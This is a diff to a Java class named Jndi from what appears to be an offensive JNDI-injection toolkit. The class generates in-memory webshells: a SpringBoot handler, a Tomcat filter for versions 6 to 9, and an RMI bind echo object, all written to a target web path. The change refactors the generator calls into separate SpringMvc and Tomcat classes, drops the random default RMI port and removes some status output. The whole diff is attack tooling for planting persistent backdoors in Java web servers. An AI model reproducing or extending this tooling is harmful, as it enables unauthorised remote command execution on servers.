@@ -70,7 +70,7 @@ public class Jndi {
         String commandArg = args.get("commandArg");
         String header = args.get("header");
         String headerValue = args.get("headerValue");
-        String rmiExObjPort = args.get("rmiExObjPort") == null ?  Integer.toString(random.nextInt(30000) + 12000) : args.get("rmiExObjPort");
+        String rmiExObjPort = args.get("rmiExObjPort");
 
         if (url == null)
             url = Utils.randomString(4);
@@ -79,19 +79,17 @@ public class Jndi {
 
         try {
             //生成SpringBoot内存马，以RegisterHandler方式注册
-            ClassDto springBootClassDto = GenerateAttack.SpringRegisterHandler(url, commandArg, header, headerValue);
+            ClassDto springBootClassDto = SpringMvc.SpringRegisterHandler(url, commandArg, header, headerValue);
             args.put("filePath", webPath);
             System.out.println("[+] \"SpringBoot\" Memory Shell Generate: ");
             PostGenerate.dispatch(springBootClassDto, "classFile", args);
             //Tomcat内存马
-            ClassDto tomcatFilterClassDto = GenerateAttack.tomcatFilter(url, commandArg, header, headerValue, "6789");
+            ClassDto tomcatFilterClassDto = Tomcat.tomcatFilter(url, commandArg, header, headerValue, "6789");
             args.put("filePath", webPath);
             System.out.println("[+] \"Tomcat Filter 6,7,8,9\" Memory Shell Generate: ");
             PostGenerate.dispatch(tomcatFilterClassDto, "classFile", args);
             //Rmi Echo
             ClassDto rmiBindEcho = RmiBind.bind(rmiExObjPort);
-            System.out.println("[+] \"Rmi Bind Echo\" Memory Shell Generate: ");
-            System.out.println("[+] Remote Object Bind Port: " + rmiExObjPort);
 
             args.put("filePath", webPath);
             PostGenerate.dispatch(rmiBindEcho, "classFile", args);
